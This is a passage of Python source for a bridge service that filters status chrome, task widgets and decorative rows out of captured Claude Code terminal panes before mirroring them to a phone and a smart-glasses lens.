#   Box-drawing corners "┌┐└┘├┤┬┴┼╭╮╰╯╔╗╚╝╠╣╦╩╬"
#   Mid-dot / bullets   "·•" — Claude Code's separator dots ("a · b · c")
#                       sometimes appear in pure-chrome rows alongside box
#                       drawing.
#   Block elements      "▌ ▐ ░ ▒ ▓ █" — Codex / Gemini occasionally render
#                       progress bars or vertical dividers with these.
_DECORATIVE_CHARS: frozenset[str] = frozenset(
    " \t_-─━╌╍═│┃╎╏┌┐└┘├┤┬┴┼╭╮╰╯╔╗╚╝╠╣╦╩╬·•▌▐░▒▓█"
)

# Subset of `_DECORATIVE_CHARS` used to detect long horizontal-line runs
# at the start or end of a mixed-content row (e.g. `---------------- mem0
# integration`). Includes only the linear horizontal characters — NOT box
# corners (`╭ ╮ ╰ ╯ ┌ …`) or vertical bars (`│ ┃ …`), which never form a
# "horizontal divider" run, and NOT space/tab which we treat as padding.
_STRIP_RUN_CHARS: frozenset[str] = frozenset("─━═╌╍_-▌▐░▒▓█·•")

# Block-element / quarter-block characters used for terminal pixel art —
# Claude Code's pink mascot icon at the top of every fresh session, Codex
# emblems, Gemini badges, etc. Distinct from horizontal-line and box-corner
# chars: these are FILLS, not LINES, and only show up in multi-row art.
# Used by `_count_top_pixel_art_rows` to detect and preserve the icon at
# the top of the snapshot so the user actually sees the cute character on
# the lens (and on the iOS terminal pager) instead of an icon-shaped hole.
_PIXEL_ART_CHARS: frozenset[str] = frozenset("░▒▓█▌▐▖▘▙▚▛▜▝▞▟▀▄")

# Threshold for how many consecutive `_STRIP_RUN_CHARS` qualify as a
# "long decorative run" worth stripping. Tuned to skip code constructs
# like `--no-verify`, `-- comment`, and YAML `---` (all run length ≤ 3),
# while catching the obvious `---------------- heading` style Claude Code
# emits for section dividers (run lengths of 12-80+).
_MIN_DECORATIVE_RUN_LEN = 4

# ANSI CSI escape sequence regex. Used to strip color/cursor codes
# before pattern matching so a `\x1b[32m🌿 main` row is still recognized
# as a status footer (Claude Code wraps these in color codes).
_ANSI_CSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")


def _strip_ansi(s: str) -> str:
    """Remove ANSI CSI escape sequences (color, cursor, clear). Idempotent.
    Used only for pattern recognition — the original line is preserved for
    iOS so the phone's ANSIParser still sees color codes."""
    if "\x1b" not in s:
        return s
    return _ANSI_CSI_RE.sub("", s)


def _looks_like_assistant_footer_row(line: str) -> bool:
    """Heuristic: does this row look like static Claude Code status chrome?

    Matches the branch/model/token status line, the bypass-permissions
    hint, and the "Cooked for Xm Ys" compaction status line that Claude
    Code paints at the bottom of every pane refresh. ANSI escape codes
    are stripped before the pattern check because Claude Code wraps the
    chrome rows in color codes — without the strip, `startswith("🌿")`
    fails on the `\x1b[32m🌿 main` form and the chrome leaks through.
    """
    plain = _strip_ansi(line).strip()
    if not plain:
        return False
    lower = plain.lower()
    if any(lower.startswith(p) for p in _ASSISTANT_FOOTER_PREFIXES):
        return True
    if plain.startswith("🌿"):  # color-stripped, may have non-lower emoji prefix
        return True
    return any(m in lower for m in _ASSISTANT_FOOTER_MARKERS)


def _is_decorative_only_row(line: str) -> bool:
    """True when the row is just box-drawing / underscores / whitespace.

    Claude Code's empty text-input box renders as several rows of
    underscores or horizontal box-drawing characters. On the lens with
    23 rows of budget, three rows of empty textbox border push real
    content out of view. Strip them when they sit at the bottom of the
    snapshot — they're never load-bearing content.
    """
    plain = _strip_ansi(line)
    if not plain.strip():
        return False  # pure whitespace handled by the loop's other branch
    return all(c in _DECORATIVE_CHARS for c in plain)


def _strip_long_decorative_runs(line: str) -> str:
    """Drop a ≥4-char run of horizontal decoratives from the start or end
    of a single line, keeping the inner content.

    Mirror of `_strip_decorative_divider_rows` for the *mixed-content*
    case: a row like `---------------- mem0 integration` survives the
    pure-decorative filter (because of the trailing text), but the
    leading dashes are still pure visual chrome. Stripping them keeps
    the meaningful text `mem0 integration` while removing the long
    horizontal line.

    Conservative: only runs of 4+ chars trigger the strip. That
    preserves code-adjacent constructs like `--no-verify`, `-- comment`,
    and YAML `---` markers (all 1–3 leading chars). It also preserves
    decorated headers like `── important note ──` (2 chars per side)
    where the decoratives carry intentional visual rhythm.

    Whitespace on either side of the run is preserved as padding so
    centered text doesn't slide flush-left after the strip.

    ANSI handling: when the line contains no ANSI escapes (the common
    case), strip operates on the line directly and preserves nothing
    to lose. When ANSI is present but no long run is detected (i.e. the
    line is unaffected), the original line with ANSI intact is returned.
    For the rare case of an ANSI-wrapped long run, we accept losing the
    inner content's ANSI codes for that row — color fidelity on a
    section header is not load-bearing.
    """
    plain = _strip_ansi(line)

    # Scan leading run (skip whitespace first, then count decoratives).
    i = 0
    while i < len(plain) and plain[i] in " \t":
        i += 1
    j = i
    while j < len(plain) and plain[j] in _STRIP_RUN_CHARS:
        j += 1
    has_leading = (j - i) >= _MIN_DECORATIVE_RUN_LEN

    # Scan trailing run (skip whitespace from right, then count decoratives back).
    k = len(plain)
    while k > 0 and plain[k - 1] in " \t":
        k -= 1
    m = k
    while m > 0 and plain[m - 1] in _STRIP_RUN_CHARS:
        m -= 1
    has_trailing = (k - m) >= _MIN_DECORATIVE_RUN_LEN

    if not has_leading and not has_trailing:
        return line

    # Apply the strip to `plain`. Indices `i`, `j`, `k`, `m` are valid on
    # `plain` only — after leading strip we recompute trailing offsets.
    result = plain
    if has_leading:
        result = result[:i] + result[j:]
    if has_trailing:
        k2 = len(result)
        while k2 > 0 and result[k2 - 1] in " \t":
            k2 -= 1
        m2 = k2
        while m2 > 0 and result[m2 - 1] in _STRIP_RUN_CHARS:
            m2 -= 1
        if (k2 - m2) >= _MIN_DECORATIVE_RUN_LEN:
            result = result[:m2] + result[k2:]
    return result


def _strip_decorative_divider_rows(lines: list[str]) -> list[str]:
    """Drop interior rows whose entire non-whitespace content is decorative.

    Claude Code emits long runs of `─` (U+2500) as plan-mode section
    separators between conversation blocks, the "Planning: …" line, the
    choice bar, and numbered option lists. Ghostty's monospace font draws
    those as thin baseline rules; GoogleSansCode on iOS and Meta's lens
    font render them as prominent strokes that dominate the limited real
    estate on both the phone pager and the 23-row lens budget.

    Conservative: only rows whose entire non-whitespace content (after
    ANSI escapes are stripped) is in `_DECORATIVE_CHARS` are removed.
    Rows that mix decorative characters with real text — e.g.
    `── important note ──` or `╭── label ──╮` — are preserved because
    they carry information beyond the visual rule.

    Distinct from `_strip_assistant_status_footer`, which only consumes
    decoratives from the trailing edge as part of reaching the status
    chrome below them. This pass runs first so interior dividers anywhere
    in the snapshot are removed.
    """
    return [ln for ln in lines if not _is_decorative_only_row(ln)]


def _count_top_pixel_art_rows(lines: list[str]) -> int:
    """How many consecutive top-of-snapshot rows look like multi-row pixel
    art (e.g. Claude Code's mascot icon at session start)?

    Heuristic: a row contributes when its first non-whitespace span is
    ≥3 characters from `_PIXEL_ART_CHARS`. We need ≥2 such rows in a row
    starting from the top to recognize an art block — a SINGLE row of
    block chars is treated as a Codex/Gemini progress bar (still gets
    stripped by the other passes). The cap of 6 rows keeps the search
    bounded; Claude Code's mascot is 3–4 rows tall, well within that.

    Why pin to the top: real pixel art (icons, ASCII logos) lives at the
    start of a session and stays there until the buffer scrolls past it.
    Interior block-element runs almost always come from progress bars or
    spinners which are NOT load-bearing and should still be stripped.
    Returning a non-zero count tells the poll loop "leave the first N
    rows untouched."
    """
    consecutive = 0
    for ln in lines[:6]:
        plain = _strip_ansi(ln).lstrip()
        leading = 0
        for c in plain:
            if c in _PIXEL_ART_CHARS:
                leading += 1
            else:
                break
        if leading >= 3:
            consecutive += 1
        else:
            break
    return consecutive if consecutive >= 2 else 0


def _strip_assistant_status_footer(lines: list[str]) -> list[str]:
    """Drop the contiguous block of footer-shaped rows at the bottom.

    Only strips from the END of the list. Interior matches (e.g. a
    quoted "bypass permissions" string mid-conversation) are preserved.
    Whitespace-only and decorative-only rows interleaved among the
    footer rows are also stripped so the trim survives Claude Code's
    occasional blank row between the input prompt and the status line,
    and so the empty multi-line input box outline doesn't keep the
    real footer rows from being reached.
    """
    result = list(lines)
    while result:
        last = result[-1]
        if not last.strip():
            result.pop()
            continue
        if _is_decorative_only_row(last):
            result.pop()
            continue
        if _looks_like_assistant_footer_row(last):
            result.pop()
            continue
        break
    return result


# Claude Code's TodoWrite widget renders a task summary block inside the
# terminal pane that looks like this (verbatim from a captured session):
#
#   175 tasks (165 done, 10 open)
#   ◻ Phase 6 — Future (post-PMF backlog, do not start)
#   ◻ Backlog: Save team feature
#   ◻ Validate Composio sync end-to-end for all 4 PR2 providers
#   … +5 pending, 165 completed
#
# That widget eats 6-8 rows of lens budget for content that is not
# actionable on a heads-up display. We strip it from the stream sent
# to the iPhone pager / lens transcript so real assistant output gets
# the room it needs. Three patterns to match:
#   - The header `^\d+ tasks? (\d+ done, \d+ open)`
#   - Body rows starting with one of `_TASK_CHECKBOX_CHARS`
#   - The tail `… +N pending, M completed` (with an optional leading
#     horizontal-ellipsis U+2026 OR an ASCII `...`)
_TASK_SUMMARY_HEADER_RE = re.compile(
    r"^\s*\d+\s+tasks?\s+\(\d+\s+done", re.IGNORECASE
)
# The truncation tail comes in two shapes depending on how many task
# states Claude has to summarize:
#   "… +5 pending, 165 completed"                  (2 counts)
#   "… +1 in progress, 8 pending, 134 completed"   (3 counts)
# Matching the ellipsis + ``+N <state>`` prefix where <state> is one
# of the known labels keeps the pattern specific without locking it
# to a single ordering.
_TASK_SUMMARY_TAIL_RE = re.compile(
    r"^\s*(?:…|\.{3})\s*\+\d+\s+(?:in progress|pending|completed)",
    re.IGNORECASE,
)
# Mirror of activity._TASK_CHECKBOX_CHARS — kept local to avoid a
# cross-module import for a one-string constant. Update both if Claude
# Code ever ships a new glyph. Includes BOTH outline (□ / ◻) and filled
# (■ / ◼ / ▪) variants — Claude Code uses the filled squares for
# in-progress task rows, so dropping only the outlines leaves the
# in-progress rows visible on the lens.
_TASK_CHECKBOX_CHARS: frozenset[str] = frozenset(
    "□◻▢☐☑☒✓✔■◼▪▮"
)

# The set above splits on one axis that matters for false positives:
#
#   BOX glyphs (□◻▢☐☑☒■◼▪▮) are TodoWrite-only. Nothing else in a coding
#   pane opens a line with them, so they stay a context-free signal and a
#   stranded widget row still gets stripped wherever it sits.
#
#   CHECK glyphs (✓✔) are shared with the rest of the world. Test runners
#   open their PASS lines with them -- vitest prints a `✓` per file, pytest
#   plugins and most build tools do the same. Stripping those context-free
#   mangles output asymmetrically, because the matching FAIL glyphs (✗ ×)
#   are not in the set: the user saw "✗ 2 failed" with the "✓ 41 passed"
#   above it silently removed, which reads as if nothing passed.
#
# So a bare CHECK row only counts as a widget row when it actually sits in
# a widget -- see _task_row_class and _strip_task_summary.
_TASK_CHECK_GLYPHS: frozenset[str] = frozenset("✓✔")
_TASK_BOX_GLYPHS: frozenset[str] = _TASK_CHECKBOX_CHARS - _TASK_CHECK_GLYPHS

# Box-drawing tree connectors Claude Code uses to attach the FIRST task
# row of the TodoWrite widget to a parent fold (extended-thinking,
# sub-agent, etc.). Without skipping these, `stripped[0]` lands on the
# corner instead of the checkbox and the parent row leaks through.
_TASK_TREE_PREFIX_CHARS: frozenset[str] = frozenset("└├╰╭│─ \t")

# Extended-thinking header that wraps the TodoWrite widget. Claude Code
# prints it in one of two states:
#   FOLDED  "+ Finagling… (2m 7s · ↓ 4.9k tokens · almost done thinking with max effort)"
#   ACTIVE  "· Scurrying… (1m 53s · ↓ 3.2k tokens · almost done thinking with max effort)"
# The leading glyph is a `+` fold/expand marker once the block collapses,
# or a rotating spinner (·, *, ✻, braille …) while the model is still
# thinking. The 2026-05-21 fix only anchored on the folded `+` form, so the
# active-spinner header — and the whole TodoWrite widget folded under it —
# leaked onto the lens (re-reported 2026-05-27 from the hack-day session).
# Match both via a leading fold/spinner glyph class. Three anchors keep it
# specific:
#   - leading fold/spinner glyph
#   - a parenthetical group on the line
#   - the literal word "thinking" inside the parens
# Prose like "I was thinking about this (later)" misses the glyph prefix;
# an ordinary working line ("* Blanching… (54s · ↓ 1.3k tokens)") misses
# the literal "thinking" inside the parens, so it survives untouched.
_THINKING_FOLD_RE = re.compile(
    # `.*\(` plus two adjacent `[^)]*` was ambiguous the same way
    # _WORKING_STATUS_RE was (see the note there): "." and "[^)]" both match
    # "(", so every paren was retried as the anchor. Excluding "(" from the
    # run-up and bounding both gaps makes it linear.
    r"^[+*✳✴✶✷✸✻✽✱·∙⠇-⣿]+\s+\S[^(]{0,200}\([^)]{0,120}\bthinking\b[^)]{0,120}\)",
    re.IGNORECASE,
)


def _is_task_summary_row(line: str) -> bool:
    """True when *line* is a row of Claude Code's TodoWrite widget.

    Matches all four components of the widget (header, checkbox body
    with optional tree-corner prefix, truncation tail, and the folded
    thinking-block parent line) so a single global filter removes the
    whole block regardless of where it sits in the captured pane.
    """
    return _task_row_class(line) != ""


def _task_row_class(line: str) -> str:
    """Classify *line* against Claude Code's TodoWrite widget.

    Returns:
        ``"anchor"`` -- an unambiguous widget marker (header, truncation
            tail, thinking fold, a BOX-glyph checkbox row, or any checkbox
            behind a box-drawing tree connector). Safe to strip anywhere,
            and it is what lends context to a neighbouring check row.
        ``"check"`` -- a bare ``✓``/``✔`` row with no other widget signal.
            Might be a completed task; might be a test runner's pass line.
            Only `_strip_task_summary` can tell, by looking at neighbours.
        ``""`` -- not a widget row.
    """
    plain = _strip_ansi(line)
    stripped = plain.strip()
    if not stripped:
        return ""
    if _TASK_SUMMARY_HEADER_RE.match(stripped):
        return "anchor"
    if _TASK_SUMMARY_TAIL_RE.match(stripped):
        return "anchor"
    if _THINKING_FOLD_RE.match(stripped):
        return "anchor"
    head = stripped[0]
    if head in _TASK_BOX_GLYPHS:
        return "anchor"
    if head in _TASK_CHECK_GLYPHS:
        return "check"
    # Strip leading box-drawing tree connectors (e.g. `└ `, `├─ `) and
    # try again — Claude Code uses these to attach the first widget row
    # to a folded parent block. A real connector is itself a widget
    # signal, so a ✓ behind one is an anchor rather than ambiguous:
    # no test runner draws box-drawing corners around its pass lines.
    inner = stripped.lstrip("".join(_TASK_TREE_PREFIX_CHARS))
    if inner and inner[0] in _TASK_CHECKBOX_CHARS:
        return "anchor"
    return ""


def _strip_task_summary(lines: list[str]) -> list[str]:
    """Drop Claude Code's TodoWrite task-summary widget rows.

    Anchor rows (header, tail, thinking fold, BOX-glyph checkboxes, tree-
    connector rows) are stripped wherever they appear — position-free, so a
    widget whose header has already scrolled out of the capture still goes.
    That global behaviour is deliberate and unchanged.

    Bare ``✓``/``✔`` rows are the one ambiguous case, because test runners
    use those glyphs too, so they are only stripped when they are *adjacent*
    to the widget: the walk grows outward from each anchor through runs of
    contiguous check rows. A widget's completed items are always touching
    their header or their pending siblings; a test runner's pass lines are
    not touching either.

    The residual failure mode is a fully-completed widget whose header has
    scrolled away — every row a bare ``✓``, nothing to anchor against, so it
    leaks onto the lens. That is the right way round to be wrong: a stray
    widget row costs a line of screen, a swallowed ``✓ 41 passed`` costs the
    user the answer they were looking for.
    """
    classes = [_task_row_class(ln) for ln in lines]
    drop = {i for i, kind in enumerate(classes) if kind == "anchor"}
    for anchor in sorted(drop):
        for step in (-1, 1):
            j = anchor + step
            while 0 <= j < len(lines) and classes[j] == "check" and j not in drop:
                drop.add(j)
                j += step
    return [ln for i, ln in enumerate(lines) if i not in drop]


# Claude Code's end-of-session feedback prompt:
#
#   How is Claude doing this session? (optional)
#     1: Bad    2: Fine   3: Good   0: Dismiss
#
# Inline numbered prompt asking the user to rate the session. Eats
# 2 rows of lens budget every time it appears — not useful on the
# heads-up display since the user isn't going to grade their own
# Claude session from the glasses. Two anchors:
#   - Header literal (uniquely the feedback prompt — no false
#     positives in prose).
#   - Options line, identified by the `0: Dismiss` token which is
#     specific to this widget (Claude Code's other numbered prompts
#     use `1./2./3.` with periods, not `N:` with colons).
_FEEDBACK_PROMPT_HEADER_RE = re.compile(
    r"How is Claude doing this session", re.IGNORECASE
)
_FEEDBACK_PROMPT_OPTIONS_RE = re.compile(
    r"\b0:\s*Dismiss\b", re.IGNORECASE
)


def _is_feedback_prompt_row(line: str) -> bool:
    """True when *line* is part of Claude's session-feedback widget."""
    plain = _strip_ansi(line)
    stripped = plain.strip()
    if not stripped:
        return False
    if _FEEDBACK_PROMPT_HEADER_RE.search(stripped):
        return True
    if _FEEDBACK_PROMPT_OPTIONS_RE.search(stripped):
        return True
    return False


def _strip_feedback_prompt(lines: list[str]) -> list[str]:
    """Drop the rows that make up Claude Code's session-feedback prompt."""
    return [ln for ln in lines if not _is_feedback_prompt_row(ln)]


# Claude Code's between-turns "Tip:" hint lines, e.g.
#
#   ※ Tip: Use /config to change your default permission mode
#   Tip: Use Plan Mode to scope work before editing
#
# These rotate through static onboarding hints below the input box. On
# the lens they're pure chrome — the user isn't going to act on a hint
# about a slash command from their glasses, and the line eats one of the
# ~22 visible rows every refresh. Claude Code prefixes the hint with a
# rotating decoration glyph (※ ✢ ✦ 💡 …) or nothing at all, so we anchor
# on the literal "Tip:" token after stripping any leading decoration.
# `activity.py`'s _STATUS_BAR_RE already drops these for the narration
# snippet; this is the matching pass for the terminal→lens pipeline.
_TIP_ROW_RE = re.compile(
    r"^[\s*·•※✢✦✱✻✽❖◆◇▪▶💡]*tip:\s", re.IGNORECASE
)


def _is_tip_row(line: str) -> bool:
    """True when *line* is one of Claude Code's "Tip:" hint rows."""
    plain = _strip_ansi(line).strip()
    if not plain:
        return False
    return bool(_TIP_ROW_RE.match(plain))


def _strip_tip_rows(lines: list[str]) -> list[str]:
    """Drop Claude Code's rotating "Tip:" onboarding hint rows."""
    return [ln for ln in lines if not _is_tip_row(ln)]


# Claude Code's context-window indicator row — e.g. "61% context used",
# "42% context left", or "Context left until auto-compact: 9%". The lens
# footer now carries the live context % (GlassesDisplayManager.buildFooter),
# so this inline chrome row is redundant noise in the transcript. Pattern
# mirrors bridge/activity.py's context-row detection.
_CONTEXT_INDICATOR_RE = re.compile(
    r"\d+%\s*context\s*(?:used|left|remaining)\b|context\s+left\s+until\s+auto-compact",
    re.IGNORECASE,
)


def _is_context_indicator_row(line: str) -> bool:
    """True when *line* is Claude Code's context-usage chrome ("NN% context
    used" / "Context left until auto-compact: NN%")."""
    plain = _strip_ansi(line).strip()
    if not plain:
        return False
    return bool(_CONTEXT_INDICATOR_RE.search(plain))


def _strip_context_indicator_rows(lines: list[str]) -> list[str]:
    """Drop Claude Code's context-usage indicator rows from the lens
    transcript — the footer shows the live % now, so the inline row is
    redundant and just adds noise to the read view."""
    return [ln for ln in lines if not _is_context_indicator_row(ln)]


# Claude Code's animated working-status line — e.g. "✻ Cogitating… (5m 42s)",
# "* Thinking… (12s · esc to interrupt)", "⠹ Drafting (3s)". The lens footer
# already parses this (verb + elapsed) and shows it on the bottom-left, so the
# inline copy is redundant — AND its spinner/elapsed animation is the main
# cause of the transcript "bouncing" (every tick changes the body and forces a
# repaint). Requiring a LEADING spinner glyph keeps real prose/code that merely
# contains an "-ing (Ns)" phrase from matching. Handles both the seconds-only
# "(42s)" and the minutes "(5m 42s)" forms (session_status's own regex misses
# the latter), and tolerates "esc to interrupt" appearing before or after the
# elapsed inside the parens.
_WORKING_STATUS_RE = re.compile(
    r"^\s*"
    # ≥1 leading spinner glyph. The sparkle RANGE ✢-❇ (U+2722–U+2747) covers
    # EVERY Dingbats frame Claude's spinner cycles through (✦✧✱✳✴✶✷✸✻✼✽✾✿❀…),
    # not just the handful we used to enumerate — the gaps (✼✽✾…) were why the
    # row flickered in and out as the animation ticked. Plus ascii */+ and the
    # ·/• dots and braille frames. ("-" is intentionally excluded: it's a real
    # markdown bullet and would false-strip "- Verb-ing X (Ns)" prose.)
    r"[\*\+✢-❇·•⠀-⣿]+"
    r"\s*[A-Za-z]+ing\b"                                  # gerund verb (Cogitating, Thinking, …)
    # … up to an opening paren. The class excludes "(" and is bounded on
    # purpose. Written as `[^)]*\(` it was AMBIGUOUS -- the negated class
    # matched "(" too, so every paren in the row was retried as the anchor and
    # each retry re-scanned the tail through the second `[^)]*`, making the
    # match quadratic in row length. This regex runs synchronously on the event
    # loop over up to 2000 rows of spliced transcript every 500 ms, so a single
    # 4000-char row of "(" cost 35 ms and 300 of them froze the whole bridge
    # for 2.5 s per tick. Excluding "(" leaves exactly one way to reach the
    # anchor, which makes it linear. The real status line has one paren group
    # directly after the verb, so nothing is lost.
    r"[^(]{0,80}\("
    r"[^)]{0,120}\b(?:\d+\s*[ms]\b|esc\s+to\s+interrupt\b)",  # elapsed or interrupt inside
    re.IGNORECASE,
)


# Claude Code's JUST-FINISHED status line — e.g. "✻ Crunched for 1m 7s",
# "✻ Sautéed for 14m 37s · 6 shells still running", "✻ Baked for 9m 17s",
# "✻ Cogitated for 11ms". Same role as the in-progress working line, but
# past-tense + "for <duration>" instead of a "(<elapsed>)" parenthetical, so
# the working regex above (which requires parens) misses it. Requires a
# leading sparkle/spinner glyph (NOT ·/•, which lead real bullet prose) AND a
# trailing time unit, so a real "Verb for N <noun>" line can't false-match.
_COMPLETION_STATUS_RE = re.compile(
    r"^\s*"
    r"[\*✢-❇]+\s*"                                       # leading sparkle/spinner glyph(s) — full ✢-❇ range
    r"\w+\s+for\s+\d+(?:\.\d+)?\s*(?:ms|m|s|h)\b",       # "<Verb> for <duration>"
    re.IGNORECASE,                                       # NOT ·/• (lead real bullet prose)
)


def _is_working_status_row(line: str) -> bool:
    """True when *line* is Claude Code's work-status chrome: the animated
    IN-PROGRESS form (spinner + gerund + "(elapsed)", e.g. "✻ Cogitating…
    (5m 42s)") OR the JUST-FINISHED summary form (spinner + verb + "for
    <duration>", e.g. "✻ Crunched for 1m 7s"). The footer carries the live
    status, so both are redundant in the transcript — and stripping the
    animated in-progress form also stops the text bouncing as the spinner
    and timer tick each poll."""
    plain = _strip_ansi(line).strip()
    if not plain:
        return False
    return bool(_WORKING_STATUS_RE.match(plain) or _COMPLETION_STATUS_RE.match(plain))


def _strip_working_status_rows(lines: list[str]) -> list[str]:
    """Drop Claude Code's animated working-status rows from the lens
    transcript. The footer carries the same status (verb + elapsed), and
    dropping the inline animated copy also stops the text from bouncing as
    the spinner/timer ticks."""
    return [ln for ln in lines if not _is_working_status_row(ln)]


def _is_strict_chrome_row(line: str) -> bool:
    """Stricter chrome detector for the global (non-bottom) filter.

    Differs from ``_looks_like_assistant_footer_row`` in one critical
    way: marker phrases ("bypass permissions", "shift+tab to cycle")
    must appear at the START of the line (after whitespace), not
    anywhere. Otherwise prose like "I want to discuss the bypass
    permissions feature" would false-match and disappear from the
    user's conversation.

    Prefixes (``🌿``, ``⏵⏵``, ``►►``, ``✻ cooked for``) are unchanged:
    real conversation never starts with those, so leading-substring
    is already safe.
    """
    plain = _strip_ansi(line).strip()
    if not plain:
        return False
    lower = plain.lower()
    if any(lower.startswith(p) for p in _ASSISTANT_FOOTER_PREFIXES):
        return True
    if plain.startswith("🌿"):
        return True
    # Marker-as-leading-token check — strict version of the
    # substring scan in _looks_like_assistant_footer_row.
    if any(lower.startswith(m) for m in _ASSISTANT_FOOTER_MARKERS):
        return True
    return False


def _strip_assistant_chrome_anywhere(lines: list[str]) -> list[str]:
    """Filter out Claude Code's status chrome rows regardless of position.

    The bottom-walking ``_strip_assistant_status_footer`` only works
    when chrome is the LAST content in the snapshot. But Claude Code
    sometimes paints transient UI BELOW the chrome — e.g. the
    agent-selection menu (``⏺ main`` / ``◯ Explore`` rows with an
    ``↑/↓ to select`` hint) appears underneath the bypass-permissions
    line during a Task spawn flow. The bottom-walker stops at the
    menu and leaves the chrome stranded mid-snapshot, eating ~2 rows
    of the lens budget that should go to real content.

    Uses the STRICT chrome matcher (leading-token only) so prose
    containing "bypass permissions" or similar phrases mid-sentence
    survives. Decorative-only rows that ADJOIN a chrome row are also
    dropped so we don't leave an orphan rule behind — Claude Code
    wraps its footer in ``────`` rules above and below.
    """
    if not lines:
        return lines
    flags = [_is_strict_chrome_row(ln) for ln in lines]
    out: list[str] = []
    for i, ln in enumerate(lines):
        if flags[i]:
            continue
        if _is_decorative_only_row(ln):
            # Drop a rule iff it directly touches a chrome row (no
            # gap, no other content between). Real section dividers
            # mid-conversation don't get clobbered.
            prev_is_chrome = i > 0 and flags[i - 1]
            next_is_chrome = i + 1 < len(lines) and flags[i + 1]
            if prev_is_chrome or next_is_chrome:
                continue
        out.append(ln)
    return out


def _apply_chrome_filters(lines: list[str]) -> list[str]:
    """Strip assistant TUI chrome from a capture-pane snapshot.

    This is the ``filtered`` terminal mode: the small-screen clients (phone
    mirror, glasses lens) get the conversation without Claude Code's static
    footer, tip rows, task widget and decorative dividers, because on a 22-row
    lens that chrome eats a third of the row budget.

    The ``ansi`` mode (a headset panel, ~48 rows, where the point is fidelity)
    skips this entirely and ships the pane verbatim. SGR escapes survive BOTH
    paths -- capture-pane runs with ``-e`` and nothing here strips them;
    ``_strip_ansi`` is only ever used to build a plain-text *comparison* key
    inside the predicates below.
    """
    art_count = _count_top_pixel_art_rows(lines)
    art_rows = lines[:art_count]
    body = lines[art_count:]

    # Drop Claude Code's plan-mode `─` section dividers anywhere
    # they appear. Must run before the footer strip so interleaved
    # decorative rows don't block the footer walker from reaching
    # up to the real status/hint chrome.
    body = _strip_decorative_divider_rows(body)

    # Strip Claude Code's status footer (branch/model/token line
    # and bypass-permissions hint). These are static chrome that
    # always sits below the user's input prompt; on the glasses
    # lens they eat 2-3 rows of the 22 visible. The user wants
    # to see their actual typing, not the same hint every refresh.
    body = _strip_assistant_status_footer(body)
    # Second chrome pass: scan EVERYWHERE for chrome rows that
    # the bottom-walker missed. Claude Code paints the agent-
    # spawn selection menu ("⏺ main", "◯ Explore", ...) BELOW
    # the status chrome, which strands the chrome mid-snapshot
    # where the bottom-walker won't reach it. This filter is
    # safe to do globally because the chrome patterns are
    # specific enough (`🌿 main`, `⏵⏵ bypass permissions`) to
    # avoid false-positives on real conversation text.
    body = _strip_assistant_chrome_anywhere(body)
    # Task-summary pass: drop Claude Code's TodoWrite widget
    # (header + checkbox rows + truncation tail). On the lens
    # this widget eats 6-8 of 23 visible rows for no
    # actionable signal — voice TTS already announces task
    # completions, and the phone-side pager doesn't need to
    # see it either since the user can ask the assistant
    # directly. The patterns are widget-specific so
    # false-positives on real conversation are vanishingly
    # rare.
    body = _strip_task_summary(body)
    # Session-feedback pass: drop Claude Code's "How is Claude
    # doing this session?" survey prompt. Same justification —
    # not actionable on the heads-up display.
    body = _strip_feedback_prompt(body)
    # Tip pass: drop the rotating "Tip: Use /config …" onboarding
    # hints Claude Code paints below the input box. Pure chrome on
    # the lens — the user can't act on a slash-command hint from
    # their glasses, and it eats a row every refresh.
    body = _strip_tip_rows(body)
    # Context-indicator pass: drop Claude Code's "NN% context used" /
    # auto-compact status row. The lens footer shows the live context %
    # (see GlassesDisplayManager.buildFooter), so the inline chrome row
    # is redundant — cutting it keeps the read view cleaner.
    body = _strip_context_indicator_rows(body)
    # NOTE: Claude Code's animated working-status row ("✻ Cogitating…
    # (5m 42s)") is intentionally NOT stripped here. It's useful live
    # signal everywhere the shared terminal_content goes — the iOS phone
    # mirror AND the Glassbox web view (which proxies this feed through
    # its own server, so it has no browser Origin to single out). The
    # ONLY place it's unwanted is the GLASSES LENS, so that strip lives
    # lens-side in iOS (GlassesDisplayManager.isWorkingStatusRow, applied
    # in AppState's onRequestTranscriptLines). _strip_working_status_rows
    # / _is_working_status_row + the complete-frame _WORKING_STATUS_RE
    # are kept here purely as the source of truth that the Swift port
    # mirrors (and for tests).

    # Per-line strip of long leading/trailing decorative runs
    # (e.g. `---------------- mem0 integration` → ` mem0
    # integration`). Catches the mixed-content case that the
    # pure-row strip can't, leaves code constructs like
    # `--no-verify` and 2-char-bordered headers untouched.
    body = [_strip_long_decorative_runs(ln) for ln in body]

    return art_rows + body


async def _terminal_poll_loop(
    session_id: str, ws: WebSocket, mode: str = _DEFAULT_TERMINAL_MODE
) -> None:
    """Poll tmux capture-pane every ~1s and push content when it changes.

    ``mode`` selects the render path -- see ``_apply_chrome_filters``.
    """
    session = sessions.get_session(session_id)
    if not session or not session.tmux_target:
        return
    tmux_target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
    if tmux_err or not tmux_target:
        return

    # Sentinel: matches no real capture-pane output (a real first snapshot is
    # at minimum [""] for an empty pane, never None). Forces the first
    # iteration to always emit, so iOS clears its "Connecting to terminal…"
    # spinner even when the pane is currently idle.
    last_content_key: list[str] | None = None  # working-rows-stripped compare key
    last_raw_lines: list[str] | None = None    # raw lines as last sent
    last_sent_at = 0.0                          # monotonic time of last send

    # Resolve the transcript JSONL once up front (cheap glob). It may not exist
    # yet if the session just started — in that case re-glob every ~5s until it
    # appears, then transparently upgrade the mirror to transcript-sourced
    # scrollback. None throughout = plain tmux mirror (e.g. a non-assistant pane).
    transcript_assistant = (getattr(session, "assistant", "claude") or "claude")
    transcript_path = find_transcript_path(session) if _TRANSCRIPT_SCROLLBACK_ENABLED else None
    transcript_retry_at = 0.0  # time.monotonic() gate for re-globbing
    try:
        while True:
            # Re-lookup session each iteration so we pick up re-registrations
            # and stop polling if the session was removed/replaced.
            session = sessions.get_session(session_id)
            if not session or not session.tmux_target:
                break
            tmux_target, tmux_err = _validate_tmux_pane_target(session.tmux_target)
            if tmux_err or not tmux_target:
                break
            proc = await asyncio.create_subprocess_exec(
                "tmux", "capture-pane", "-t", tmux_target,
                "-p", "-e", "-S", f"-{_TERMINAL_CAPTURE_LINES}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
                env=get_subprocess_env(),
            )
            stdout, _ = await proc.communicate()
            if proc.returncode != 0:
                # tmux pane is gone — notify subscriber and stop polling
                try:
                    await send_signed(ws, {
                        "type": "terminal_error",
                        "session_id": session_id,
                        "message": "Terminal session ended",
